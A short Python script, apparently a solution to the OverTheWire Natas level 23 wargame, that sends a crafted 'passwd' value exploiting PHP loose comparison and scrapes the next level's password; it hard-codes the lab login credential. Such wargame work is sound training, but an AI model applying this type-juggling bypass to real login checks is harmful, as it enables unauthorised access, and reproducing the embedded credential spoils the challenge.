import requests as req

# Произвольное число
number = "123456"
url = "http://natas23.natas.labs.overthewire.org/index.php"
payload = "?passwd=%siloveyou" % number

if __name__ == '__main__':
    r = req.post(url=url+payload, auth=('natas23', 'D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE'))
    i1 = r.text.index("Password: ")
    i2 = r.text[i1:].index("</pre>")+i1
    print(r.text[i1:i2])
